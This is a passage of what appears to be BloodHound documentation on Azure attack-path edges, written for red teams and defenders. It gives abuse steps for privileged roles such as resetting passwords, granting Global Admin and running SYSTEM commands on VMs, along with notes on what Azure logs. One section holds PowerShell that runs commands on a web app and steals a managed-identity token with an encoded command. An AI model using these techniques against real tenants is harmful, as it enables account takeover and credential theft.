<li><p><a class="reference external" href="https://blog.netspi.com/attacking-azure-with-custom-script-extensions/">https://blog.netspi.com/attacking-azure-with-custom-script-extensions/</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#owner">https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#owner</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azprivilegedauthadmin">
<h2>AZPrivilegedAuthAdmin<a class="headerlink" href="#azprivilegedauthadmin" title="Link to this heading"></a></h2>
<p>This edge indicates the principal has the Privileged Authentication Administrator
role active against the target tenant. Principals with this role can update
sensitive properties for all users. Privileged Authentication Administrator can
set or reset any authentication method (including passwords) for any user,
including Global Administrators.</p>
<section id="id192">
<h3>Abuse Info<a class="headerlink" href="#id192" title="Link to this heading"></a></h3>
<p>See the abuse info under AZAddSecret or AZResetPassword.</p>
</section>
<section id="id193">
<h3>Opsec Considerations<a class="headerlink" href="#id193" title="Link to this heading"></a></h3>
<p>See the opsec consideration under AZAddSecret or AZResetPassword.</p>
</section>
<section id="id194">
<h3>References<a class="headerlink" href="#id194" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator">https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azprivilegedroleadmin">
<h2>AZPrivilegedRoleAdmin<a class="headerlink" href="#azprivilegedroleadmin" title="Link to this heading"></a></h2>
<p>The Privileged Role Admin role can grant any other admin role to another principal
at the tenant level.</p>
<section id="id195">
<h3>Abuse Info<a class="headerlink" href="#id195" title="Link to this heading"></a></h3>
<p>Activate the Global Admin role for yourself or for another user using PowerZure or
PowerShell.</p>
</section>
<section id="id196">
<h3>Opsec Considerations<a class="headerlink" href="#id196" title="Link to this heading"></a></h3>
<p>The Azure Activity Log will log who activated an admin role for what other principal,
including the date and time.</p>
</section>
<section id="id197">
<h3>References<a class="headerlink" href="#id197" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azresetpassword">
<h2>AZResetPassword<a class="headerlink" href="#azresetpassword" title="Link to this heading"></a></h2>
<p>The ability to change another user’s password without knowing their current password.</p>
<section id="id198">
<h3>Abuse Info<a class="headerlink" href="#id198" title="Link to this heading"></a></h3>
<p>Find the user in the Azure portal, then click “Reset Password”, or use PowerZure’s
Set-AzureUserPassword cmdlet. If password write-back is enabled, this password will
also be set for a synced on-prem user.</p>
</section>
<section id="id199">
<h3>Opsec Considerations<a class="headerlink" href="#id199" title="Link to this heading"></a></h3>
<p>Azure will log each password reset event, including who performed the reset, against which account, and at what date and time.</p>
</section>
<section id="id200">
<h3>References<a class="headerlink" href="#id200" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azrunsas">
<h2>AZRunsAs<a class="headerlink" href="#azrunsas" title="Link to this heading"></a></h2>
<p>The Azure App runs as the Service Principal when it needs to authenticate to the tenant.</p>
<section id="id201">
<h3>Abuse Info<a class="headerlink" href="#id201" title="Link to this heading"></a></h3>
<p>This edge should be taken into consideration when abusing control of an app. Apps authenticate
with service principals to the tenant, so if you have control of an app, what you are abusing
is that control plus the fact that the app runs as a privileged service principal.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azuseraccessadministrator">
<h2>AZUserAccessAdministrator<a class="headerlink" href="#azuseraccessadministrator" title="Link to this heading"></a></h2>
<p>The User Access Admin role can edit roles against many other objects.</p>
<section id="id202">
<h3>Abuse Info<a class="headerlink" href="#id202" title="Link to this heading"></a></h3>
<p>This role can be used to grant yourself or another principal any privilege
you want against Automation Accounts, VMs, Key Vaults, and Resource Groups.
Use the Azure portal to add a new, abusable role assignment against the target
object for yourself.</p>
</section>
<section id="id203">
<h3>Opsec Considerations<a class="headerlink" href="#id203" title="Link to this heading"></a></h3>
<p>Azure will log any role activation event for any object type.</p>
</section>
<section id="id204">
<h3>References<a class="headerlink" href="#id204" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azvmadminlogin">
<h2>AZVMAdminLogin<a class="headerlink" href="#azvmadminlogin" title="Link to this heading"></a></h2>
<p>When a virtual machine is configured to allow logon with Azure
AD credentials, the VM automatically has certain principals
added to its local administrators group, including any principal
granted the Virtual Machine Administrator Login (or “VMAL”)
admin role.</p>
<p>Any principal granted this role, scoped to the affected VM, can
connect to the VM via RDP and will be granted local admin rights
on the VM.</p>
<section id="id205">
<h3>Abuse Info<a class="headerlink" href="#id205" title="Link to this heading"></a></h3>
<p>Connect to the VM via RDP and you will be granted local admin rights
on the VM.</p>
</section>
<section id="id206">
<h3>Opsec Considerations<a class="headerlink" href="#id206" title="Link to this heading"></a></h3>
<p>If the target computer is a workstation and a user is currently
logged on, one of two things will happen. If the user you are
abusing is the same user as the one logged on, you will
effectively take over their session and kick the logged on user
off, resulting in a message to the user. If the users are
different, you will be prompted to kick the currently logged on
user off the system and log on. If the target computer is a
server, you will be able to initiate the connection without
issue provided the user you are abusing is not currently logged
in.</p>
<p>Remote desktop will create Logon and Logoff events with the
access type RemoteInteractive.</p>
</section>
<section id="id207">
<h3>References<a class="headerlink" href="#id207" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/tactics/TA0008/">https://attack.mitre.org/tactics/TA0008/</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1021/">https://attack.mitre.org/techniques/T1021/</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/active-directory/devices/howto-vm-sign-in-azure-ad-windows">https://docs.microsoft.com/en-us/azure/active-directory/devices/howto-vm-sign-in-azure-ad-windows</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azvmcontributor">
<h2>AZVMContributor<a class="headerlink" href="#azvmcontributor" title="Link to this heading"></a></h2>
<p>The Virtual Machine contributor role grants almost all abusable
privileges against Virtual Machines.</p>
<section id="id208">
<h3>Abuse Info<a class="headerlink" href="#id208" title="Link to this heading"></a></h3>
<p>The Virtual Machine Contributor role allows you to run SYSTEM
commands on the VM</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azureruncommand">Invoke-AzureRunCommand</a></p></li>
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunmsbuild">Invoke-AzureRunMSBuild</a></p></li>
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram">Invoke-AzureRunProgram</a></p></li>
</ul>
</section>
<section id="id212">
<h3>Opsec Considerations<a class="headerlink" href="#id212" title="Link to this heading"></a></h3>
<p>Because you’ll be running a command as the SYSTEM user on the
Virtual Machine, the same opsec considerations for running malicious
commands on any system should be taken into account: command line
logging, PowerShell script block logging, EDR, etc.</p>
</section>
<section id="id213">
<h3>References<a class="headerlink" href="#id213" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms/">https://blog.netspi.com/running-powershell-scripts-on-azure-vms/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azwebsitecontributor">
<h2>AZWebsiteContributor<a class="headerlink" href="#azwebsitecontributor" title="Link to this heading"></a></h2>
<p>The Website Contributor role grants full control of the target
Function App or Web App. Full control of either of those types
of resources allows for arbitrary command execution against the
target resoruce.</p>
<section id="id214">
<h3>Abuse Info<a class="headerlink" href="#id214" title="Link to this heading"></a></h3>
<p>You can use BARK’s Invoke-AzureRMWebAppShellCommand function
to execute commands on a target Web App. You can use BARK’s
New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys,
and Get-AzureFunctionOutput functions to execute arbitrary
commands against a target Function App.</p>
<p>These functions require you to supply an Azure Resource Manager
scoped JWT associated with the principal that has the privilege
to execute commands on the web app or function app. There are
several ways to acquire a JWT. For example, you may use BARK’s
Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
by supplying a refresh token:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ARMToken = Get-ARMTokenWithRefreshToken `
    -RefreshToken &quot;0.ARwA6WgJJ9X2qk...&quot; `
    -TenantID &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Now you can use BARK’s Invoke-AzureRMWebAppShellCommand function
to execute a command against the target Web App.
For example, to run a simple “whoami” command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-AzureRMWebAppShellCommand `
    -KuduURI &quot;https://mycoolwindowswebapp.scm.azurewebsites.net/api/command&quot; `
    -Token $ARMToken `
    -Command &quot;whoami&quot;
</pre></div>
</div>
<p>If the Web App has a managed identity assignments, you can use BARK’s
Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the
managed identity Service Principal like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS C:\&gt; $PowerShellCommand =
        $headers=@{&quot;X-IDENTITY-HEADER&quot;=$env:IDENTITY_HEADER}
        $response = Invoke-WebRequest -UseBasicParsing -Uri &quot;$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&amp;api-version=2019-08-01&quot; -Headers $headers
        $response.RawContent

PS C:\&gt; $base64Cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PowerShellCommand))

PS C:\&gt; $Command = &quot;powershell -enc $($base64Cmd)&quot;

PS C:\&gt; Invoke-AzureRMWebAppShellCommand `
        -KuduURI &quot;https://mycoolwindowswebapp.scm.azurewebsites.net/api/command&quot; `
        -token $ARMToken `
        -Command $Command
</pre></div>
</div>
<p>If successful, the output will include a JWT for the managed identity
service principal.</p>
</section>
<section id="id215">
<h3>Opsec Considerations<a class="headerlink" href="#id215" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id216">
<h3>References<a class="headerlink" href="#id216" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
<li><p><a class="reference external" href="https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/">https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95">https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="nodes.html" class="btn btn-neutral float-left" title="Nodes" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../further-reading/further-reading.html" class="btn btn-neutral float-right" title="Further Reading/Viewing" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2016-2023, Specter Ops Inc..</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>